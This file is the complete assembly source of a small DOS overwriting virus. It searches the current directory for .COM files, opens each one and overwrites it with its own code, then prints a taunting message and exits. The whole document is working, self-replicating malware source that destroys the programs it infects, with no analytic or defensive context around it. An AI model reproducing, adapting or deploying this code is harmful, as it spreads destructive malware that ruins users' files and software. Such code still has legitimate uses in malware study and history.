FILE_N EQU 9Eh
ORG 100h

SEARCH_INIT:
    mov ah, 4Eh ; Find first file.
    mov dx, TARGET_FILE_TYPE
    int 21h

SEARCH_AND_INFECT_LOOP:
    jc PAYLOAD ; File not found.

    mov ax, 3D02h ; Open file with read/write permissions.
    mov dx, FILE_N
    int 21h 

    jc FIND_NEXT ; Jump to FIND_NEXT if file could not be infected.

    xchg ax, bx ; Infect target file.
    mov ah, 40h 
    mov dx, 100h 
    mov cx, 79 ; Number of bytes to write ( size of file )
    int 21h

    mov ah, 3Eh ; Close file.
    int 21h

FIND_NEXT:
    mov ah, 4Fh 
    int 21h
    jmp SEARCH_AND_INFECT_LOOP

PAYLOAD: 
    mov ah, 9h
    mov dx, MSG
    int 21h

EXIT:
    mov ax, 4C01h
    int 21h

MSG DB "lol, game over, boi",0xa,"$"
TARGET_FILE_TYPE DB "*.COM",0
